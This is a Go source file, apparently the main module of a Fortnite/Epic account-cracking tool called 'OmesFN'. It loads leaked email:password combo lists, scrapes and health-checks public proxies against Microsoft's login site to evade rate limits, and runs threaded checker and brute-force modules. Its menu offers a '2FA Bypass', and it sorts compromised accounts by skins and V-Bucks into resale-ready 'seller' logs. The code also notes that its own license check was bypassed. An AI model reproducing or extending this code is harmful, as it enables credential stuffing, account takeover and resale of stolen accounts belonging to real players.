package main

import (
	"bufio"
	"bytes"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"

	"github.com/go-ini/ini"
	"github.com/hugolgst/rich-go/client"
)

var (
	dashboardEnabled  bool = false
	dashboardMutex    sync.Mutex
	dashboardData     = map[string]interface{}{}
	UseScrapedProxies bool
	ScrapedProxies    []string
)

func LoadConfig() bool {
	LogInfo("Loading configuration from config.ini...")
	cfg, err := ini.Load("config.ini")
	if err != nil {
		LogError(fmt.Sprintf("Failed to load config.ini: %v", err))
		return false
	}
	LogInfo("Loaded configuration file")
	LogInfo("Reading General settings")
	generalSection, err := cfg.GetSection("General")
	if err == nil {
		if key, err := generalSection.GetKey("threads"); err == nil {
			if threads, err := key.Int(); err == nil {
				ThreadCount = threads
			}
		}
		if key, err := generalSection.GetKey("proxyless_max_threads"); err == nil {
			if maxThreads, err := key.Int(); err == nil && maxThreads > 0 {
				ProxylessMaxThreads = maxThreads
			}
		}
	}
	LogInfo("Reading Proxies settings")
	proxiesSection, err := cfg.GetSection("Proxies")
	if err == nil {
		if key, err := proxiesSection.GetKey("use_proxies"); err == nil {
			UseProxies, _ = key.Bool()
		}
		if key, err := proxiesSection.GetKey("proxy_type"); err == nil {
			ProxyType = key.String()
		}
	} else {
		UseProxies = false
		ProxyType = "http"
	}
	LogInfo("Reading License settings")
	licenseSection, err := cfg.GetSection("License")
	if err != nil {
		LogError("License section missing in config.ini")
		return false
	}
	userKey, err := licenseSection.GetKey("key")
	if err != nil {
		LogError("License key missing in config.ini")
		return false
	}
	inputKey := userKey.String()
	if strings.TrimSpace(inputKey) == "" {
		LogError("License key cannot be empty")
		return false
	}
	LogInfo("License validation bypassed - KeyAuth removed")
	LeftDays = "Unlimited"
	inboxSection, err := cfg.GetSection("Inbox")
	if err == nil {
		if key, err := inboxSection.GetKey("search_keywords"); err == nil {
			keywordsStr := key.String()
			if keywordsStr != "" {
				keywords := strings.Split(keywordsStr, ",")
				var processedKeywords []string
				for _, k := range keywords {
					trimmed := strings.TrimSpace(k)
					if strings.Contains(trimmed, "@") && strings.Contains(trimmed, ".") {
						processedKeywords = append(processedKeywords, fmt.Sprintf("from:%s", trimmed))
					} else {
						processedKeywords = append(processedKeywords, trimmed)
					}
				}
				InboxWord = strings.Join(processedKeywords, ",")
				IsInBox = len(processedKeywords) > 0
			}
		}
	}
	discordSection, err := cfg.GetSection("Discord")
	if err == nil {
		if key, err := discordSection.GetKey("webhook_url"); err == nil {
			DiscordWebhookURL = key.String()
		}
		if key, err := discordSection.GetKey("send_all_hits"); err == nil {
			SendAllHits, _ = key.Bool()
		}
	}
	rpcSection, err := cfg.GetSection("DiscordRPC")
	if err == nil {
		if key, err := rpcSection.GetKey("enabled"); err == nil {
			RPCEnabled, _ = key.Bool()
		}
	}
	dashboardSection, err := cfg.GetSection("Dashboard")
	if err == nil {
		if key, err := dashboardSection.GetKey("enabled"); err == nil {
			dashboardEnabled, _ = key.Bool()
		}
	}
	LogSuccess("Configuration and license validated successfully!")
	return true
}

func ClearConsole() {
	cmd := exec.Command("cmd", "/c", "cls")
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func PrintLogo() {
	for _, line := range AsciiArt {
		LogInfo(line)
	}
	fmt.Println()
	LogInfo(fmt.Sprintf("License Status: [%s]", LeftDays))
	fmt.Println()
}

func ScrapeProxies() []string {
	LogInfo("Scraping proxies from multiple sites...")

	apiURLs := []string{
		"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=elite",
		"https://raw.githubusercontent.com/mmpx12/proxy-list/refs/heads/master/https.txt",
		"https://www.proxy-list.download/api/v1/get?type=http",
		"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/refs/heads/master/http.txt",
	}

	client := &http.Client{Timeout: 15 * time.Second}

	rawChan := make(chan []string, len(apiURLs))
	errChan := make(chan string, len(apiURLs))
	var wg sync.WaitGroup

	for _, urlStr := range apiURLs {
		wg.Add(1)
		go func(u string) {
			defer wg.Done()
			start := time.Now()
			resp, err := client.Get(u)
			if err != nil {
				errChan <- fmt.Sprintf("Site %s failed after %v: %v", u, time.Since(start), err)
				return
			}
			defer resp.Body.Close()

			if resp.StatusCode != 200 {
				errChan <- fmt.Sprintf("Site %s returned %s (took %v)", u, resp.Status, time.Since(start))
				return
			}

			body, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				errChan <- fmt.Sprintf("Site %s read failed: %v", u, err)
				return
			}

			proxies := strings.Split(string(body), "\n")
			var clean []string
			for _, p := range proxies {
				p = strings.TrimSpace(p)
				if p != "" && strings.Contains(p, ":") {
					parts := strings.Split(p, ":")
					if len(parts) == 2 {
						clean = append(clean, p)
					}
				}
			}
			LogInfo(fmt.Sprintf("Site %s: %d raw proxies (took %v)", u, len(clean), time.Since(start)))
			rawChan <- clean
		}(urlStr)
	}

	wg.Wait()
	close(rawChan)
	close(errChan)

	proxySet := make(map[string]bool)
	for rawList := range rawChan {
		for _, p := range rawList {
			proxySet[p] = true
		}
	}

	for errMsg := range errChan {
		LogError(errMsg)
	}

	var allProxies []string
	for p := range proxySet {
		allProxies = append(allProxies, p)
	}

	LogInfo(fmt.Sprintf("Combined %d unique raw proxies from %d sites.", len(allProxies), len(apiURLs)))
	return allProxies
}

func CheckProxyHealth(proxy string) bool {
	transport := &http.Transport{
		Proxy:                 http.ProxyURL(&url.URL{Scheme: "http", Host: proxy}),
		MaxIdleConns:          100,
		IdleConnTimeout:       90 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
	}
	client := &http.Client{Transport: transport, Timeout: 10 * time.Second}
	resp, err := client.Get("https://login.live.com")
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	return resp.StatusCode == 200
}

func FilterHealthyProxies(rawProxies []string) []string {
	const maxConcurrent = 500
	sem := make(chan struct{}, maxConcurrent)
	var healthy []string
	var wg sync.WaitGroup
	healthChan := make(chan string, len(rawProxies))
	errChan := make(chan error, len(rawProxies))

	var checked int64

	for _, proxy := range rawProxies {
		wg.Add(1)
		go func(p string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()
			if CheckProxyHealth(p) {
				healthChan <- p
			} else {
				errChan <- fmt.Errorf("unhealthy: %s", p)
			}
			if atomic.AddInt64(&checked, 1)%100 == 0 {
				LogInfo(fmt.Sprintf("Health check progress: %d/%d checked", checked, len(rawProxies)))
			}
		}(proxy)
	}
	wg.Wait()
	close(healthChan)
	close(errChan)
	for p := range healthChan {
		healthy = append(healthy, p)
	}
	for range errChan {
	}
	uptime := (float64(len(healthy)) / float64(len(rawProxies))) * 100
	LogInfo(fmt.Sprintf("Filtered to %d healthy proxies (%.1f%% uptime).", len(healthy), uptime))
	return healthy
}

func AskForProxyScraping() {
	reader := bufio.NewReader(os.Stdin)

	for {
		ClearConsole()
		PrintLogo()
		LogInfo("Would you like to scrape proxies from sites and use them? [y/n] (or 'p' for manual proxies/proxyless)")
		fmt.Print("[>] ")
		input, err := reader.ReadString('\n')
		if err != nil {
			LogWarning("Failed to read input, please try again.")
			continue
		}

		input = strings.TrimSpace(strings.ToLower(input))
		if input == "" {
			LogWarning("No input detected. Please enter y, n, or p.")
			continue
		}

		switch input {
		case "y", "yes":
			UseScrapedProxies = true
			rawProxies := ScrapeProxies()
			if len(rawProxies) > 0 {
				Proxies = FilterHealthyProxies(rawProxies)
				UseProxies = len(Proxies) > 0
				ProxyType = "http"
				if UseProxies {
					LogSuccess(fmt.Sprintf("Loaded %d healthy scraped proxies.", len(Proxies)))
					if len(Proxies) > 0 {
						proxyFile, err := os.Create("scraped_proxies.txt")
						if err == nil {
							for _, p := range Proxies {
								fmt.Fprintln(proxyFile, p)
							}
							proxyFile.Close()
							LogInfo("Saved healthy proxies to scraped_proxies.txt")
						} else {
							LogWarning("Could not save scraped_proxies.txt: " + err.Error())
						}
					}
				} else {
					LogWarning("No healthy proxies found after filtering, falling back to proxyless.")
				}
			} else {
				UseProxies = false
				LogWarning("Scraping failed or returned no proxies, falling back to proxyless.")
			}
			return
		case "p":
			UseScrapedProxies = false
			AskForProxies()
			return
		case "n", "no":
			UseScrapedProxies = false
			UseProxies = false
			LogInfo("Continuing without proxies.")
			return
		default:
			LogWarning("Invalid option. Please enter y, n, or p.")
		}
	}
}

func LoadFiles() {
	ClearConsole()
	PrintLogo()
	// Load combos
	file, err := os.Open("combo.txt")
	if err != nil {
		LogError("combo.txt file not found!")
		time.Sleep(1 * time.Second)
		return
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	var tempCombos []string
	for scanner.Scan() {
		tempCombos = append(tempCombos, strings.TrimSpace(scanner.Text()))
	}
	LogInfo(fmt.Sprintf("Loaded [%d] combos from combo.txt!", len(tempCombos)))
	originalCount := len(tempCombos)
	comboSet := make(map[string]bool)
	for _, combo := range tempCombos {
		comboSet[combo] = true
	}
	Ccombos = make([]string, 0, len(comboSet))
	for combo := range comboSet {
		Ccombos = append(Ccombos, combo)
	}
	validCombos := make([]string, 0, len(Ccombos))
	for _, combo := range Ccombos {
		if strings.ContainsAny(combo, ":;|") {
			validCombos = append(validCombos, combo)
		}
	}
	Ccombos = validCombos
	validComboCount := len(Ccombos)
	dupes := originalCount - len(comboSet)
	filtered := len(comboSet) - validComboCount
	LogInfo(fmt.Sprintf("Removed [%d] dupes, [%d] invalid, total valid: [%d]", dupes, filtered, validComboCount))
	if UseProxies {
		proxyFile, err := os.Open("proxies.txt")
		if err != nil {
			LogError("proxies.txt file not found!")
		} else {
			defer proxyFile.Close()
			scanner := bufio.NewScanner(proxyFile)
			Proxies = []string{}
			for scanner.Scan() {
				Proxies = append(Proxies, strings.TrimSpace(scanner.Text()))
			}
			LogInfo(fmt.Sprintf("Loaded [%d] proxies from proxies.txt!", len(Proxies)))
		}
	}
	time.Sleep(1 * time.Second)
}

func AskForThreads() {
	reader := bufio.NewReader(os.Stdin)
	for {
		ClearConsole()
		PrintLogo()
		LogInfo("Thread Amount?")
		fmt.Print("[>] ")
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)
		threads, err := strconv.Atoi(input)
		if err == nil && threads > 0 {
			ThreadCount = threads
			break
		}
	}
}

func AskForProxies() {
	reader := bufio.NewReader(os.Stdin)
	ClearConsole()
	PrintLogo()
	LogInfo("Select Proxy Type [1] - HTTP/S | [2] - Socks4 | [3] - Socks5 | [4] - Proxyless")
	fmt.Print("[>] ")
	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(choice)
	switch choice {
	case "1":
		ProxyType = "http"
		UseProxies = true
	case "2":
		ProxyType = "socks4"
		UseProxies = true
	case "3":
		ProxyType = "socks5"
		UseProxies = true
	case "4":
		UseProxies = false
	default:
		AskForProxies()
	}
}

func AskForInboxKeyword() {
	reader := bufio.NewReader(os.Stdin)
	ClearConsole()
	PrintLogo()
	LogInfo("Enter keywords to search in inboxes (comma-separated, leave empty for just inbox check)")
	fmt.Print("[>] ")
	keywordsInput, _ := reader.ReadString('\n')
	keywordsInput = strings.TrimSpace(keywordsInput)
	if keywordsInput == "" {
		InboxWord = ""
		IsInBox = false
		return
	}
	keywords := strings.Split(keywordsInput, ",")
	var processedKeywords []string
	for _, k := range keywords {
		trimmed := strings.TrimSpace(k)
		if strings.Contains(trimmed, "@") && strings.Contains(trimmed, ".") {
			processedKeywords = append(processedKeywords, fmt.Sprintf("from:%s", trimmed))
		} else {
			processedKeywords = append(processedKeywords, trimmed)
		}
	}
	InboxWord = strings.Join(processedKeywords, ",")
	IsInBox = true
}

func loadSkinsList() {
	absPath, err := filepath.Abs("Skinslist.omes")
	if err != nil {
		LogWarning(fmt.Sprintf("Could not get absolute path for skin list: %v", err))
		return
	}
	content, err := ioutil.ReadFile(absPath)
	if err != nil {
		LogWarning("Skin list file not found")
		return
	}
	lines := strings.Split(string(content), "\n")
	for _, line := range lines {
		parts := strings.SplitN(line, ":", 2)
		if len(parts) == 2 {
			key := strings.ToLower(strings.TrimSpace(parts[0]))
			value := strings.TrimSpace(parts[1])
			Mapping[key] = value
		}
	}
}

func LoadProxies(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxy := strings.TrimSpace(scanner.Text())
		if proxy != "" && strings.Contains(proxy, ":") {
			parts := strings.Split(proxy, ":")
			if len(parts) == 2 {
				proxies = append(proxies, proxy)
			}
		}
	}
	return proxies, scanner.Err()
}

func centerText(text string, width int) string {
	if len(text) >= width {
		return text
	}
	padding := (width - len(text)) / 2
	return strings.Repeat(" ", padding) + text
}

func saveVbucksHit(entry string, vbucks int) {
	folderID := GetStats().getSessionFolder()
	baseDir := filepath.Join("Results", folderID)

	writeHit := func(filename string, counter *int64) {
		filePath := filepath.Join(baseDir, filename)
		file, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err == nil {
			defer file.Close()
			file.WriteString(entry + "\n")
			atomic.AddInt64(counter, 1)
		}
	}

	if vbucks > 1000 {
		writeHit("1k+_vbucks_hits.txt", &Vbucks1kPlus)
	}
	if vbucks > 3000 {
		writeHit("3k+_vbucks_hits.txt", &Vbucks3kPlus)
	}
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

func checkRareSkinsAdapted(skinsList string) (bool, []string, []string) {
	hasOgRare := false
	ogSkinsFound := []string{}
	rareSkinsFound := []string{}
	skins := strings.Split(skinsList, ", ")
	for _, skin := range skins {
		trimmedSkin := strings.TrimSpace(skin)
		if trimmedSkin == "" {
			continue
		}
		// Check OGs
		for _, ogSkinStr := range strings.Split(OGRaresList, ",") {
			og := strings.TrimSpace(ogSkinStr)
			if og != "" && (strings.Contains(strings.ToLower(trimmedSkin), strings.ToLower(og)) || strings.Contains(strings.ToLower(og), strings.ToLower(trimmedSkin))) {
				if !contains(ogSkinsFound, og) {
					ogSkinsFound = append(ogSkinsFound, og)
				}
				hasOgRare = true
			}
		}
		// Check Rares
		for _, rareSkinStr := range strings.Split(RaresList, ",") {
			rare := strings.TrimSpace(rareSkinStr)
			if rare != "" && (strings.Contains(strings.ToLower(trimmedSkin), strings.ToLower(rare)) || strings.Contains(strings.ToLower(rare), strings.ToLower(trimmedSkin))) {
				if !contains(rareSkinsFound, rare) {
					rareSkinsFound = append(rareSkinsFound, rare)
				}
			}
		}
	}
	return hasOgRare, ogSkinsFound, rareSkinsFound
}

func SortLogs(reader *bufio.Reader) {
	ClearConsole()
	PrintLogo()
	LogInfo("Select folder to sort logs:")

	dirs, err := ioutil.ReadDir("Results")
	if err != nil {
		LogError("No Results folder found or error reading it.")
		time.Sleep(2 * time.Second)
		return
	}

	folderList := []string{}
	for _, f := range dirs {
		if f.IsDir() {
			folderList = append(folderList, f.Name())
		}
	}

	if len(folderList) == 0 {
		LogError("No folders found in Results.")
		time.Sleep(2 * time.Second)
		return
	}

	for i, f := range folderList {
		LogInfo(fmt.Sprintf("[%d] %s", i+1, f))
	}

	fmt.Print("[>] ")
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)
	idx, err := strconv.Atoi(input)
	if err != nil || idx < 1 || idx > len(folderList) {
		LogWarning("Invalid selection.")
		time.Sleep(1 * time.Second)
		return
	}

	selected := folderList[idx-1]
	basePath := filepath.Join("Results", selected)

	catMap := map[string]string{
		"0_skins.txt":    "0 Skins",
		"1-9_skins.txt":  "1+ Skins",
		"10+_skins.txt":  "10+ Skins",
		"50+_skins.txt":  "50+ Skins",
		"100+_skins.txt": "100+ Skins",
		"200+_skins.txt": "200+ Skins",
		"300+_skins.txt": "300+ Skins",
	}

	// Collect exclusives by scanning all files
	var exclusives []string
	for fileName := range catMap {
		filePath := filepath.Join(basePath, fileName)
		content, err := ioutil.ReadFile(filePath)
		if err != nil {
			continue
		}
		lines := strings.Split(string(content), "\n")
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if !strings.HasPrefix(line, "Account:") {
				continue
			}
			parts := strings.Split(line, " | ")
			fields := make(map[string]string)
			for _, p := range parts {
				kv := strings.SplitN(p, ": ", 2)
				if len(kv) == 2 {
					fields[kv[0]] = kv[1]
				}
			}
			if _, ok := fields["Account"]; !ok {
				continue
			}
			acc := fields["Account"]
			epicEmail := fields["Epic Email"]
			skinCountStr := fields["Skin Count"]
			vbucks := fields["V-Bucks"]
			methods := fields["2FA Methods"]
			stw := fields["Has STW"]
			lastPlayed := fields["Last Played"]
			skins := fields["Skins"]

			hasOg, ogFound, rareFound := checkRareSkinsAdapted(skins)
			if hasOg || len(rareFound) > 0 {
				var trigger string
				var foundList []string
				if hasOg {
					trigger = "OG skins"
					foundList = ogFound
				} else {
					trigger = "Exclusive Skins"
					foundList = rareFound
				}
				exclEntry := fmt.Sprintf("%s | Epic Email: %s | %s: %s | Skin Count: %s | V-Bucks: %s | 2FA Methods: %s | STW: %s | Last Played: %s",
					acc, epicEmail, trigger, strings.Join(foundList, ", "), skinCountStr, vbucks, methods, stw, lastPlayed)
				exclusives = append(exclusives, exclEntry)
			}
		}
	}

	outPath := filepath.Join(basePath, "sorted_log.txt")
	f, err := os.Create(outPath)
	if err != nil {
		LogError(fmt.Sprintf("Failed to create %s", outPath))
		time.Sleep(2 * time.Second)
		return
	}
	defer f.Close()

	if len(exclusives) > 0 {
		fmt.Fprintf(f, "==================== Exclusives & Ogs ====================\n")
		for _, e := range exclusives {
			fmt.Fprintf(f, "%s\n", e)
		}
		fmt.Fprintln(f)
	}

	for fileName, section := range catMap {
		filePath := filepath.Join(basePath, fileName)
		content, err := ioutil.ReadFile(filePath)
		if err != nil {
			continue
		}
		lines := strings.Split(string(content), "\n")
		var entries []string
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if !strings.HasPrefix(line, "Account:") {
				continue
			}
			parts := strings.Split(line, " | ")
			fields := make(map[string]string)
			for _, p := range parts {
				kv := strings.SplitN(p, ": ", 2)
				if len(kv) == 2 {
					fields[kv[0]] = kv[1]
				}
			}
			if _, ok := fields["Account"]; !ok {
				continue
			}
			acc := fields["Account"]
			epicEmail := fields["Epic Email"]
			fa := fields["FA"]
			verified := fields["Email Verified"]
			methods := fields["2FA Methods"]
			vbucks := fields["V-Bucks"]
			skinCountStr := fields["Skin Count"]
			lastPlayed := fields["Last Played"]
			psn := fields["PSN"]
			nintendo := fields["Nintendo"]
			skins := fields["Skins"]

			sellerEntry := fmt.Sprintf("Epic Email: %s | FA: %s | Email Verified: %s | 2FA Methods: %s | V-Bucks: %s | Skin Count: %s | Last Played: %s | PSN Connectable: %s | Nintendo Connectable: %s | Skins: %s",
				epicEmail, fa, verified, methods, vbucks, skinCountStr, lastPlayed, psn, nintendo, skins)
			fullEntry := fmt.Sprintf("%s | %s", acc, sellerEntry)
			entries = append(entries, fullEntry)
		}
		if len(entries) > 0 {
			fmt.Fprintf(f, "==================== %s ====================\n", section)
			for _, e := range entries {
				fmt.Fprintf(f, "%s\n", e)
			}
			fmt.Fprintln(f)
		}
	}

	LogSuccess(fmt.Sprintf("Sorted log created: %s/sorted_log.txt", selected))
	fmt.Println("\nPress Enter to continue...")
	reader.ReadString('\n')
}

func main() {
	debugFlag := flag.Bool("debug", false, "Enable debug mode to display response data")
	flag.Parse()
	DebugMode = *debugFlag
	if DebugMode {
		initDebugLog()
	}
	log.SetOutput(os.Stdout)
	log.SetFlags(0)
	reader := bufio.NewReader(os.Stdin)
	if !LoadConfig() {
		LogInfo("Configuration or license validation failed. Press Enter to exit.")
		reader.ReadString('\n')
		return
	}
	LogSuccess("License valid! Welcome!")
	Level = "1"
	time.Sleep(1 * time.Second)
	if RPCEnabled {
		initDiscordRPC()
		updateDiscordPresence("Idle", "Ready to check Fortnite accounts")
	}
	loadSkinsList()
	for {
		ClearConsole()
		PrintLogo()
		LogInfo("╔════════════════════════════════════════╗")
		LogInfo("║              Main Menu                 ║")
		LogInfo("╠════════════════════════════════════════╣")
		LogInfo("║ [1] Run FN Checker                     ║")
		LogInfo("║ [2] Bruter                             ║")
		LogInfo("║ [3] Sort Logs                          ║")
		LogInfo("║ [4] 2FA Bypass                         ║")
		LogInfo("║ [0] Exit                               ║")
		LogInfo("╚════════════════════════════════════════╝")
		fmt.Print("\n [>] ")
		choice, _ := reader.ReadString('\n')
		choice = strings.TrimSpace(choice)
		switch choice {
		case "1":
			if ThreadCount <= 0 {
				AskForThreads()
			}
			if ProxyType == "" {
				AskForProxies()
			}
			LoadFiles()
			AskForProxyScraping()
			if UseProxies && !UseScrapedProxies {
				Proxies, err := LoadProxies("proxies.txt")
				if err != nil {
					LogError("Failed to load proxies: " + err.Error())
					Proxies = []string{}
				} else {
					LogInfo(fmt.Sprintf("Loaded [%d] proxies from proxies.txt!", len(Proxies)))
				}
			}
			if !UseProxies && ProxylessMaxThreads > 0 && ThreadCount > ProxylessMaxThreads {
				LogInfo(fmt.Sprintf("Proxyless mode detected - capping threads to %d to reduce rate-limit skips.", ProxylessMaxThreads))
				ThreadCount = ProxylessMaxThreads
			}
			if len(Ccombos) == 0 {
				LogError("No valid combos loaded. Please check combo.txt. Exiting.")
				time.Sleep(3 * time.Second)
				return
			}
			ClearConsole()
			PrintLogo()
			LogInfo("Press any key to start checking!")
			var modules []func(string) bool
			modules = append(modules, CheckAccount)
			reader.ReadString('\n')
			CheckerRunning = true
			Sw = time.Now()
			var titleWg sync.WaitGroup
			titleWg.Add(1)
			go UpdateTitle(&titleWg)
			go func() {
				for _, combo := range Ccombos {
					Combos <- combo
				}
			}()
			WorkWg.Add(len(Ccombos))
			var wg sync.WaitGroup
			for i := 0; i < ThreadCount; i++ {
				wg.Add(1)
				go func(workerID int) {
					defer wg.Done()
					defer func() {
						if r := recover(); r != nil {
							LogError(fmt.Sprintf("CRITICAL: Worker %d crashed with panic: %v", workerID, r))
							LogError(fmt.Sprintf("Worker %d recovery: Other workers continue running", workerID))
						}
					}()
					for combo := range Combos {
						if !CheckerRunning {
							return
						}
						for _, module := range modules {
							done := make(chan bool, 1)
							go func(combo string, module func(string) bool) {
								defer func() {
									if r := recover(); r != nil {
										LogError(fmt.Sprintf("Module panic recovered for combo %s: %v", combo, r))
									}
								}()
								module(combo)
								done <- true
							}(combo, module)
							select {
							case <-done:
							case <-time.After(45 * time.Second):
								LogError(fmt.Sprintf("TIMEOUT: Module for combo %s took longer than 45s", combo))
							}
						}
						WorkWg.Done()
					}
				}(i)
			}
			WorkWg.Wait()
			close(Combos)
			wg.Wait()
			CheckerRunning = false
			titleWg.Wait()
			LogSuccess("\nAll checking completed! Hit counts:")
			stats := fmt.Sprintf("MS: %d | Hits: %d | Epic 2FA: %d", MsHits, Hits, EpicTwofa)
			fmt.Printf("%s[SUCCESS] %s%s\n", ColorGreen, centerText(stats, 80), ColorReset)
			if len(FailureReasons) > 0 {
				LogInfo("\nFailure reasons:")
				for _, reason := range FailureReasons {
					LogError(reason)
				}
			}
			LogError("\nPress Enter to exit...")
			reader.ReadString('\n')
			return
		case "2":
			if ThreadCount <= 0 {
				AskForThreads()
			}
			if ProxyType == "" {
				AskForProxies()
			}
			LoadFiles()
			AskForProxyScraping()
			if UseProxies && !UseScrapedProxies {
				Proxies, err := LoadProxies("proxies.txt")
				if err != nil {
					LogError("Failed to load proxies: " + err.Error())
					Proxies = []string{}
				} else {
					LogInfo(fmt.Sprintf("Loaded [%d] proxies from proxies.txt!", len(Proxies)))
				}
			}
			if !UseProxies && ProxylessMaxThreads > 0 && ThreadCount > ProxylessMaxThreads {
				LogInfo(fmt.Sprintf("Proxyless mode detected - capping threads to %d to reduce rate-limit skips.", ProxylessMaxThreads))
				ThreadCount = ProxylessMaxThreads
			}
			if len(Ccombos) == 0 {
				LogError("No valid combos loaded. Please check combo.txt. Exiting.")
				time.Sleep(3 * time.Second)
				return
			}

			Check = 0
			Hits = 0
			Bad = 0
			Retries = 0
			Cpm = 0
			initialComboCount = len(Ccombos)

			ClearConsole()
			PrintLogo()
			LogInfo("Press any key to start bruteforcing!")
			reader.ReadString('\n')

			var modules []func(string) bool
			modules = append(modules, BruterCheck)

			CheckerRunning = true
			Sw = time.Now()

			var titleWg sync.WaitGroup
			titleWg.Add(1)
			go UpdateBruterTitle(&titleWg)

			go func() {
				for _, combo := range Ccombos {
					Combos <- combo
				}
			}()

			WorkWg.Add(len(Ccombos))
			var wg sync.WaitGroup
			for i := 0; i < ThreadCount; i++ {
				wg.Add(1)
				go func(workerID int) {
					defer wg.Done()
					defer func() {
						if r := recover(); r != nil {
							LogError(fmt.Sprintf("CRITICAL: Worker %d crashed with panic: %v", workerID, r))
							LogError(fmt.Sprintf("Worker %d recovery: Other workers continue running", workerID))
						}
					}()
					for combo := range Combos {
						if !CheckerRunning {
							return
						}
						for _, module := range modules {
							done := make(chan bool, 1)
							go func(combo string, module func(string) bool) {
								defer func() {
									if r := recover(); r != nil {
										LogError(fmt.Sprintf("Module panic recovered for combo %s: %v", combo, r))
									}
								}()
								module(combo)
								done <- true
							}(combo, module)
							select {
							case <-done:
							case <-time.After(45 * time.Second):
								LogError(fmt.Sprintf("TIMEOUT: Module for combo %s took longer than 45s", combo))
							}
						}
						WorkWg.Done()
					}
				}(i)
			}

			WorkWg.Wait()
			close(Combos)
			wg.Wait()
			CheckerRunning = false
			titleWg.Wait()

			LogSuccess("\nAll bruteforcing completed!")
			stats := fmt.Sprintf("Checked: %d | Bypassed: %d | Failed: %d | Retries: %d", Check, Hits, Bad, Retries)
			fmt.Printf("%s[SUCCESS] %s%s\n", ColorGreen, centerText(stats, 80), ColorReset)

			LogInfo(fmt.Sprintf("\nResults saved to: %s", getBruterResultsFolder()))
			LogError("\nPress Enter to continue...")
			reader.ReadString('\n')
		case "3":
			SortLogs(reader)
		case "4":
			Handle2FABypass(reader)
		case "0":
			LogInfo("Exiting...")
			return
		default:
			LogWarning("Invalid choice, please try again.")
			time.Sleep(1 * time.Second)
		}
	}
}

func displayDashboard() {
	if !dashboardEnabled {
		return
	}

	total := len(Ccombos)
	checked := int(Check)
	elapsed := time.Since(Sw)
	minutes := int(elapsed.Minutes())
	seconds := int(elapsed.Seconds()) % 60

	ClearConsole()

	// Center the title
	title := "OmesFN Menu"
	padding := (40 - len(title)) / 2
	centeredTitle := strings.Repeat(" ", padding) + title
	fmt.Printf("\n%s\n\n", centeredTitle)

	progressPercent := 0.0
	if total > 0 {
		progressPercent = float64(checked) / float64(total) * 100
	}
	remaining := total - checked
	eta := estimateCompletionTime(total, checked, int(elapsed.Seconds()))

	// Center PROGRESS section
	progressHeader := "Progress"
	progressPadding := (40 - len(progressHeader)) / 2
	fmt.Printf("%s%s\n", strings.Repeat(" ", progressPadding), progressHeader)

	progressLine1 := fmt.Sprintf("Checked: %d/%d (%.1f%%)", checked, total, progressPercent)
	progressPadding1 := (40 - len(progressLine1)) / 2
	fmt.Printf("%s%s\n", strings.Repeat(" ", progressPadding1), progressLine1)

	progressLine2 := fmt.Sprintf("Remaining: %d | ETA: %s", remaining, eta)
	progressPadding2 := (40 - len(progressLine2)) / 2
	fmt.Printf("%s%s\n\n", strings.Repeat(" ", progressPadding2), progressLine2)

	cpm := atomic.LoadInt64(&Cpm) * 60
	atomic.StoreInt64(&Cpm, 0)

	// Center PERFORMANCE section
	perfHeader := "Performance"
	perfPadding := (40 - len(perfHeader)) / 2
	fmt.Printf("%s%s\n", strings.Repeat(" ", perfPadding), perfHeader)

	perfLine := fmt.Sprintf("CPM: %d | Time: %dm %ds", cpm, minutes, seconds)
	perfLinePadding := (40 - len(perfLine)) / 2
	fmt.Printf("%s%s\n\n", strings.Repeat(" ", perfLinePadding), perfLine)

	// Center HITS OVERVIEW section
	hitsHeader := "Hits Overview"
	hitsPadding := (40 - len(hitsHeader)) / 2
	fmt.Printf("%s%s\n", strings.Repeat(" ", hitsPadding), hitsHeader)

	hitsLine1 := fmt.Sprintf("Total Hits: %d | Epic 2FA: %d | 2FA: %d", Hits, EpicTwofa, Twofa)
	hitsLine1Padding := (40 - len(hitsLine1)) / 2
	fmt.Printf("%s%s\n", strings.Repeat(" ", hitsLine1Padding), hitsLine1)

	hitsLine2 := fmt.Sprintf("FA: %d | Headless: %d | Rares: %d", Sfa, Headless, Rares)
	hitsLine2Padding := (40 - len(hitsLine2)) / 2
	fmt.Printf("%s%s\n\n", strings.Repeat(" ", hitsLine2Padding), hitsLine2)

	// Center SKIN CATEGORIES section
	skinHeader := "Skins"
	skinPadding := (40 - len(skinHeader)) / 2
	fmt.Printf("%s%s\n", strings.Repeat(" ", skinPadding), skinHeader)

	skinLines := []string{
		fmt.Sprintf("0 Skins: %d", int(ZeroSkin)),
		fmt.Sprintf("1-9 Skins: %d", int(OnePlus)),
		fmt.Sprintf("10+ Skins: %d", int(TenPlus)),
		fmt.Sprintf("50+ Skins: %d", int(FiftyPlus)),
		fmt.Sprintf("100+ Skins: %d", int(HundredPlus)),
		fmt.Sprintf("300+ Skins: %d", int(ThreeHundredPlus)),
	}

	for _, line := range skinLines {
		linePadding := (40 - len(line)) / 2
		fmt.Printf("%s%s\n", strings.Repeat(" ", linePadding), line)
	}
	fmt.Println()

	// Center V-Bucks Section
	vbucksHeader := "V-bucks"
	vbucksPadding := (40 - len(vbucksHeader)) / 2
	fmt.Printf("%s%s\n", strings.Repeat(" ", vbucksPadding), vbucksHeader)

